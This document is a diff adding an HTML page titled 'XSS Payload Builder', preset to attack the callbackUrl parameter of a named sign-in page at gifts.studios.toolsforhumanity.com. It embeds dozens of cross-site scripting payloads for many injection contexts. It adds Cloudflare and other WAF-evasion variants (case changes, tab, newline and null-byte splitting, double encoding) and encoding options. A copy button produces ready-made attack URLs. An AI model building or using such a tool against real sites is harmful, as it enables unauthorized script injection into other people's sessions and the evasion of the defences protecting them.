@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>XSS Payload Builder</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;800&display=swap');
+
+  :root {
+    --bg: #0a0a0f;
+    --surface: #111118;
+    --surface2: #1a1a24;
+    --border: #2a2a3a;
+    --accent: #00ff88;
+    --accent2: #ff6b35;
+    --accent3: #7c3aed;
+    --text: #e8e8f0;
+    --muted: #666680;
+    --danger: #ff4444;
+    --warn: #ffaa00;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    min-height: 100vh;
+    padding: 24px;
+  }
+
+  h1 {
+    font-family: 'Syne', sans-serif;
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--accent);
+    letter-spacing: -0.5px;
+    margin-bottom: 4px;
+  }
+
+  .subtitle {
+    color: var(--muted);
+    font-size: 12px;
+    margin-bottom: 28px;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: 280px 1fr;
+    gap: 16px;
+    max-width: 1100px;
+  }
+
+  .panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+  }
+
+  .panel-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: var(--muted);
+    margin-bottom: 14px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* === LEFT PANEL === */
+  .section { margin-bottom: 20px; }
+  .section-label {
+    font-size: 10px;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+  }
+
+  .option-group { display: flex; flex-direction: column; gap: 6px; }
+
+  .option-btn {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 7px 10px;
+    cursor: pointer;
+    text-align: left;
+    transition: all 0.15s;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .option-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .option-btn.active { border-color: var(--accent); background: rgba(0,255,136,0.08); color: var(--accent); }
+  .option-btn .badge {
+    font-size: 9px;
+    padding: 2px 6px;
+    border-radius: 4px;
+    background: var(--border);
+    color: var(--muted);
+  }
+  .option-btn.active .badge { background: rgba(0,255,136,0.2); color: var(--accent); }
+
+  /* Restrictions */
+  .restriction-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
+  .restriction-btn {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 5px 8px;
+    cursor: pointer;
+    text-align: center;
+    transition: all 0.15s;
+  }
+  .restriction-btn:hover { border-color: var(--danger); }
+  .restriction-btn.active { border-color: var(--danger); background: rgba(255,68,68,0.1); color: var(--danger); }
+
+  /* === RIGHT PANEL === */
+  .right-panel { display: flex; flex-direction: column; gap: 14px; }
+
+  .target-bar {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .target-label { color: var(--muted); font-size: 11px; white-space: nowrap; }
+  .target-input {
+    flex: 1;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--accent2);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    padding: 7px 10px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  .target-input:focus { border-color: var(--accent2); }
+
+  .payload-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+  }
+
+  .payload-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+    cursor: pointer;
+    transition: all 0.15s;
+    position: relative;
+  }
+  .payload-card:hover { border-color: var(--accent); }
+  .payload-card.blocked { opacity: 0.35; cursor: not-allowed; border-color: var(--danger) !important; }
+  .payload-card.blocked::after {
+    content: 'RESTRICTED';
+    position: absolute;
+    top: 8px; right: 8px;
+    font-size: 8px;
+    color: var(--danger);
+    border: 1px solid var(--danger);
+    border-radius: 3px;
+    padding: 1px 4px;
+  }
+
+  .payload-name {
+    font-family: 'Syne', sans-serif;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--accent);
+    margin-bottom: 6px;
+  }
+
+  .payload-code {
+    font-size: 10px;
+    color: var(--text);
+    word-break: break-all;
+    line-height: 1.5;
+    background: var(--surface2);
+    border-radius: 4px;
+    padding: 6px 8px;
+    margin-bottom: 6px;
+  }
+
+  .payload-note {
+    font-size: 9px;
+    color: var(--muted);
+    line-height: 1.4;
+  }
+
+  /* Output */
+  .output-panel {
+    background: var(--surface);
+    border: 1px solid var(--accent);
+    border-radius: 10px;
+    padding: 16px;
+  }
+
+  .output-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+
+  .output-url {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 12px;
+    font-size: 11px;
+    color: var(--text);
+    word-break: break-all;
+    line-height: 1.6;
+    margin-bottom: 10px;
+    min-height: 44px;
+  }
+
+  .output-url .param { color: var(--accent2); }
+  .output-url .payload-highlight { color: var(--accent); font-weight: 600; }
+
+  .btn-row { display: flex; gap: 8px; }
+  .action-btn {
+    background: var(--accent);
+    color: var(--bg);
+    border: none;
+    border-radius: 6px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 11px;
+    padding: 8px 16px;
+    cursor: pointer;
+    transition: opacity 0.15s;
+    letter-spacing: 0.5px;
+  }
+  .action-btn:hover { opacity: 0.85; }
+  .action-btn.secondary {
+    background: var(--surface2);
+    color: var(--text);
+    border: 1px solid var(--border);
+  }
+  .action-btn.secondary:hover { border-color: var(--accent); color: var(--accent); }
+
+  .copied {
+    color: var(--accent);
+    font-size: 11px;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .copied.show { opacity: 1; }
+
+  .no-payloads {
+    text-align: center;
+    color: var(--muted);
+    font-size: 12px;
+    padding: 30px;
+  }
+
+  /* Encoding section */
+  .encode-row { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
+  .encode-btn {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 4px 9px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .encode-btn:hover { border-color: var(--accent3); color: var(--accent3); }
+  .encode-btn.active { border-color: var(--accent3); background: rgba(124,58,237,0.1); color: var(--accent3); }
+
+  .waf-indicator {
+    display: flex; align-items: center; gap: 8px;
+    padding: 8px 12px;
+    border-radius: 6px;
+    font-size: 10px;
+    margin-bottom: 10px;
+  }
+  .waf-indicator.cloudflare { background: rgba(255,106,53,0.1); border: 1px solid rgba(255,106,53,0.3); color: var(--accent2); }
+  .waf-indicator.none { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2); color: var(--accent); }
+  .waf-dot { width: 7px; height: 7px; border-radius: 50%; }
+  .waf-dot.orange { background: var(--accent2); }
+  .waf-dot.green { background: var(--accent); }
+
+  select {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 6px 8px;
+    outline: none;
+    width: 100%;
+    cursor: pointer;
+  }
+  select:focus { border-color: var(--accent); }
+</style>
+</head>
+<body>
+
+<h1>⚡ XSS Payload Builder</h1>
+<p class="subtitle">gifts.studios.toolsforhumanity.com — callbackUrl parameter</p>
+
+<div class="grid">
+  <!-- LEFT CONFIG PANEL -->
+  <div class="panel">
+    <div class="panel-title">Configuration</div>
+
+    <div class="section">
+      <div class="section-label">Injection Context</div>
+      <div class="option-group" id="contextGroup">
+        <button class="option-btn" data-val="html" onclick="setOption('context','html',this)">HTML Context <span class="badge">tags</span></button>
+        <button class="option-btn" data-val="js" onclick="setOption('context','js',this)">JavaScript Context <span class="badge">eval</span></button>
+        <button class="option-btn" data-val="css" onclick="setOption('context','css',this)">CSS Context <span class="badge">style</span></button>
+        <button class="option-btn active" data-val="url" onclick="setOption('context','url',this)">URL Parameter <span class="badge">href</span></button>
+        <button class="option-btn" data-val="attr" onclick="setOption('context','attr',this)">HTML Attribute <span class="badge">attr</span></button>
+        <button class="option-btn" data-val="dom" onclick="setOption('context','dom',this)">DOM Context <span class="badge">sink</span></button>
+        <button class="option-btn" data-val="json" onclick="setOption('context','json',this)">JSON Context <span class="badge">data</span></button>
+        <button class="option-btn" data-val="xml" onclick="setOption('context','xml',this)">XML Context <span class="badge">node</span></button>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-label">WAF Type</div>
+      <select id="wafSelect" onchange="setWAF(this.value)">
+        <option value="none">No WAF</option>
+        <option value="cloudflare" selected>Cloudflare</option>
+        <option value="aws">AWS WAF</option>
+        <option value="akamai">Akamai</option>
+        <option value="modsec">ModSecurity</option>
+        <option value="f5">F5 ASM</option>
+      </select>
+    </div>
+
+    <div class="section">
+      <div class="section-label">Encoding</div>
+      <div class="encode-row">
+        <button class="encode-btn" onclick="toggleEncode('url',this)">URL Encode</button>
+        <button class="encode-btn" onclick="toggleEncode('double',this)">Double Encode</button>
+        <button class="encode-btn" onclick="toggleEncode('html',this)">HTML Entity</button>
+        <button class="encode-btn" onclick="toggleEncode('unicode',this)">Unicode</button>
+        <button class="encode-btn" onclick="toggleEncode('base64',this)">Base64</button>
+        <button class="encode-btn" onclick="toggleEncode('hex',this)">Hex</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-label">Character Restrictions</div>
+      <div class="restriction-grid">
+        <button class="restriction-btn" onclick="toggleRestriction('angle',this)">No &lt; &gt;</button>
+        <button class="restriction-btn" onclick="toggleRestriction('quotes',this)">No " '</button>
+        <button class="restriction-btn" onclick="toggleRestriction('parens',this)">No ( )</button>
+        <button class="restriction-btn" onclick="toggleRestriction('slash',this)">No /</button>
+        <button class="restriction-btn" onclick="toggleRestriction('semi',this)">No ;</button>
+        <button class="restriction-btn" onclick="toggleRestriction('length',this)">Length Limit</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div class="right-panel">
+    <!-- Target URL -->
+    <div class="target-bar">
+      <span class="target-label">Target:</span>
+      <input class="target-input" id="targetUrl" 
+        value="https://gifts.studios.toolsforhumanity.com/auth/sign-in"
+        oninput="updateOutput()"/>
+    </div>
+
+    <!-- WAF Info -->
+    <div id="wafInfo" class="waf-indicator cloudflare">
+      <div class="waf-dot orange"></div>
+      Cloudflare WAF detected — blocks: javascript:, &lt;script&gt;, alert(), onerror=
+    </div>
+
+    <!-- Payload Cards -->
+    <div class="panel">
+      <div class="panel-title">Available Payloads — click to select</div>
+      <div class="payload-grid" id="payloadGrid">
+      </div>
+    </div>
+
+    <!-- Output -->
+    <div class="output-panel">
+      <div class="output-title">⚡ Generated URL</div>
+      <div class="output-url" id="outputUrl">Select a payload above...</div>
+      <div class="btn-row">
+        <button class="action-btn" onclick="copyUrl()">Copy URL</button>
+        <button class="action-btn secondary" onclick="copyPayloadOnly()">Copy Payload Only</button>
+        <span class="copied" id="copiedMsg">✓ Copied!</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const state = {
+  context: 'url',
+  waf: 'cloudflare',
+  encoding: new Set(),
+  restrictions: new Set(),
+  selectedPayload: null
+};
+
+const PAYLOADS = {
+  html: [
+    { name: 'Basic Script Tag', raw: '<script>alert(1)</script>', note: 'Classic HTML injection', needs: [] },
+    { name: 'IMG onerror', raw: '<img src=x onerror=alert(1)>', note: 'No script tag needed', needs: [] },
+    { name: 'SVG onload', raw: '<svg onload=alert(1)>', note: 'SVG vector', needs: [] },
+    { name: 'Input autofocus', raw: '<input autofocus onfocus=alert(1)>', note: 'No user interaction', needs: [] },
+    { name: 'Details/Summary', raw: '<details open ontoggle=alert(1)>', note: 'HTML5 vector', needs: [] },
+    { name: 'Body onload', raw: '<body onload=alert(1)>', note: 'Body tag injection', needs: [] },
+  ],
+  js: [
+    { name: 'Direct eval', raw: 'alert(1)', note: 'If injected into JS context', needs: [] },
+    { name: 'String break', raw: "'-alert(1)-'", note: 'Break out of string', needs: [] },
+    { name: 'Template literal', raw: '`${alert(1)}`', note: 'Template string escape', needs: [] },
+    { name: 'Function call', raw: 'eval(atob("YWxlcnQoMSk="))', note: 'Base64 encoded payload', needs: [] },
+    { name: 'setTimeout', raw: 'setTimeout(alert,0,1)', note: 'No parentheses on alert', needs: [] },
+    { name: 'Constructor', raw: '[].constructor.constructor("alert(1)")()', note: 'CSP bypass attempt', needs: [] },
+  ],
+  css: [
+    { name: 'Expression (IE)', raw: 'a{x:expression(alert(1))}', note: 'Old IE only', needs: [] },
+    { name: 'Import URL', raw: '@import "javascript:alert(1)"', note: 'CSS import injection', needs: [] },
+    { name: 'Background URL', raw: 'background:url(javascript:alert(1))', note: 'Old browser vector', needs: [] },
+  ],
+  url: [
+    { name: 'javascript: URI', raw: 'javascript:alert(1)', note: 'If used in href/src sink', needs: [] },
+    { name: 'javascript: void', raw: 'javascript:void(0)', note: 'WAF probe — does : block?', needs: [] },
+    { name: 'UPPERCASE bypass', raw: 'JAVASCRIPT:alert(1)', note: 'Case-insensitive WAF bypass', needs: [] },
+    { name: 'Tab char bypass', raw: 'javas\tcript:alert(1)', note: 'Tab in keyword', needs: [] },
+    { name: 'Newline bypass', raw: 'javas\ncript:alert(1)', note: 'Newline in keyword', needs: [] },
+    { name: 'Null byte', raw: 'javascript\x00:alert(1)', note: 'Null byte between keyword', needs: [] },
+    { name: 'Double URL enc', raw: 'javascript%253Aalert(1)', note: 'Double encoded colon', needs: [] },
+    { name: 'Data URI', raw: 'data:text/html,<script>alert(1)</script>', note: 'Data URI vector', needs: [] },
+    { name: 'Vbscript (IE)', raw: 'vbscript:msgbox(1)', note: 'IE-only fallback', needs: [] },
+    { name: 'Alert bypass (CF)', raw: 'javascript:confirm(1)', note: 'confirm() if alert blocked', needs: [] },
+    { name: 'Prompt bypass (CF)', raw: 'javascript:prompt(1)', note: 'prompt() if alert blocked', needs: [] },
+    { name: 'Throw bypass', raw: 'javascript:throw(alert)(1)', note: 'No parens on alert', needs: [] },
+  ],
+  attr: [
+    { name: 'onmouseover', raw: '" onmouseover="alert(1)', note: 'Quote break + event', needs: [] },
+    { name: 'autofocus onfocus', raw: '" autofocus onfocus="alert(1)', note: 'No interaction needed', needs: [] },
+    { name: 'href javascript', raw: 'javascript:alert(1)', note: 'In href attribute', needs: [] },
+    { name: 'src javascript', raw: 'javascript:alert(1)', note: 'In src attribute', needs: [] },
+    { name: 'Single quote break', raw: "' onmouseover='alert(1)", note: 'Single quote variant', needs: [] },
+    { name: 'No quote break', raw: ' onmouseover=alert(1) x=', note: 'Unquoted attribute', needs: [] },
+  ],
+  dom: [
+    { name: 'Hash injection', raw: '#<img src=x onerror=alert(1)>', note: 'Fragment-based DOM XSS', needs: [] },
+    { name: 'JSON.parse sink', raw: '{"__proto__":{"x":"y"}}', note: 'Prototype pollution', needs: [] },
+    { name: 'InnerHTML sink', raw: '<img src=x onerror=alert(1)>', note: 'innerHTML injection', needs: [] },
+    { name: 'document.write', raw: '<script>alert(1)</script>', note: 'document.write sink', needs: [] },
+  ],
+  json: [
+    { name: 'JSON string break', raw: '","x":"<script>alert(1)</script>', note: 'Break JSON string', needs: [] },
+    { name: 'JSON key inject', raw: '</script><script>alert(1)</script>', note: 'Script close/open', needs: [] },
+    { name: 'Unicode escape', raw: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', note: 'Unicode-encoded tags', needs: [] },
+  ],
+  xml: [
+    { name: 'CDATA escape', raw: ']]><script>alert(1)</script><![CDATA[', note: 'CDATA section break', needs: [] },
+    { name: 'XML entity', raw: '&lt;script&gt;alert(1)&lt;/script&gt;', note: 'Entity-encoded', needs: [] },
+    { name: 'SVG in XML', raw: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', note: 'SVG namespace', needs: [] },
+  ],
+};
+
+const WAF_BLOCKS = {
+  none: [],
+  cloudflare: ['javascript:', 'alert(', '<script', 'onerror=', 'onload=', 'onmouseover='],
+  aws: ['<script', 'javascript:', 'alert('],
+  akamai: ['<script', 'javascript:', 'eval(', 'alert('],
+  modsec: ['<script', 'javascript:', 'alert(', 'onerror', 'onload'],
+  f5: ['<script', 'javascript:', 'alert(', 'eval('],
+};
+
+const RESTRICTION_CHARS = {
+  angle: ['<', '>'],
+  quotes: ['"', "'"],
+  parens: ['(', ')'],
+  slash: ['/'],
+  semi: [';'],
+};
+
+function setOption(type, val, btn) {
+  state[type] = val;
+  document.querySelectorAll('#contextGroup .option-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderPayloads();
+  updateOutput();
+}
+
+function setWAF(val) {
+  state.waf = val;
+  const wafInfo = document.getElementById('wafInfo');
+  const blocks = WAF_BLOCKS[val];
+  if (val === 'none') {
+    wafInfo.className = 'waf-indicator none';
+    wafInfo.innerHTML = '<div class="waf-dot green"></div>No WAF — all payloads available';
+  } else {
+    wafInfo.className = 'waf-indicator cloudflare';
+    wafInfo.innerHTML = `<div class="waf-dot orange"></div>${val.toUpperCase()} WAF — blocks: ${blocks.join(', ')}`;
+  }
+  renderPayloads();
+  updateOutput();
+}
+
+function toggleEncode(type, btn) {
+  if (state.encoding.has(type)) { state.encoding.delete(type); btn.classList.remove('active'); }
+  else { state.encoding.add(type); btn.classList.add('active'); }
+  updateOutput();
+}
+
+function toggleRestriction(type, btn) {
+  if (state.restrictions.has(type)) { state.restrictions.delete(type); btn.classList.remove('active'); }
+  else { state.restrictions.add(type); btn.classList.add('active'); }
+  renderPayloads();
+  updateOutput();
+}
+
+function isBlocked(payload) {
+  const blocks = WAF_BLOCKS[state.waf] || [];
+  const lower = payload.raw.toLowerCase();
+  for (const b of blocks) {
+    if (lower.includes(b.toLowerCase())) return true;
+  }
+  for (const r of state.restrictions) {
+    const chars = RESTRICTION_CHARS[r] || [];
+    for (const c of chars) {
+      if (payload.raw.includes(c)) return true;
+    }
+  }
+  if (state.restrictions.has('length') && payload.raw.length > 50) return true;
+  return false;
+}
+
+function applyEncoding(str) {
+  if (state.encoding.has('base64')) {
+    return btoa(str);
+  }
+  if (state.encoding.has('unicode')) {
+    return str.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join('');
+  }
+  if (state.encoding.has('hex')) {
+    return str.split('').map(c => `%${c.charCodeAt(0).toString(16).padStart(2,'0')}`).join('');
+  }
+  if (state.encoding.has('html')) {
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
+  }
+  if (state.encoding.has('double')) {
+    return encodeURIComponent(encodeURIComponent(str));
+  }
+  if (state.encoding.has('url')) {
+    return encodeURIComponent(str);
+  }
+  return str;
+}
+
+function renderPayloads() {
+  const grid = document.getElementById('payloadGrid');
+  const payloads = PAYLOADS[state.context] || [];
+  if (!payloads.length) {
+    grid.innerHTML = '<div class="no-payloads">No payloads for this context</div>';
+    return;
+  }
+  grid.innerHTML = payloads.map((p, i) => {
+    const blocked = isBlocked(p);
+    return `<div class="payload-card ${blocked ? 'blocked' : ''}" onclick="${blocked ? '' : `selectPayload(${i})`}">
+      <div class="payload-name">${p.name}</div>
+      <div class="payload-code">${escHtml(p.raw)}</div>
+      <div class="payload-note">${p.note}</div>
+    </div>`;
+  }).join('');
+}
+
+function escHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function selectPayload(i) {
+  const payloads = PAYLOADS[state.context] || [];
+  state.selectedPayload = payloads[i];
+  updateOutput();
+}
+
+function buildFinalUrl() {
+  if (!state.selectedPayload) return null;
+  const base = document.getElementById('targetUrl').value;
+  const encoded = applyEncoding(state.selectedPayload.raw);
+  return `${base}?callbackUrl=${encoded}`;
+}
+
+function updateOutput() {
+  const el = document.getElementById('outputUrl');
+  if (!state.selectedPayload) {
+    el.innerHTML = '<span style="color:var(--muted)">Select a payload above...</span>';
+    return;
+  }
+  const base = document.getElementById('targetUrl').value;
+  const encoded = applyEncoding(state.selectedPayload.raw);
+  el.innerHTML = `<span style="color:var(--muted)">${escHtml(base)}</span><span class="param">?callbackUrl=</span><span class="payload-highlight">${escHtml(encoded)}</span>`;
+}
+
+function copyUrl() {
+  const url = buildFinalUrl();
+  if (!url) return;
+  navigator.clipboard.writeText(url).then(() => showCopied());
+}
+
+function copyPayloadOnly() {
+  if (!state.selectedPayload) return;
+  const encoded = applyEncoding(state.selectedPayload.raw);
+  navigator.clipboard.writeText(encoded).then(() => showCopied());
+}
+
+function showCopied() {
+  const el = document.getElementById('copiedMsg');
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 1500);
+}
+
+// Init
+renderPayloads();
+updateOutput();
+</script>
+</body>
+</html>
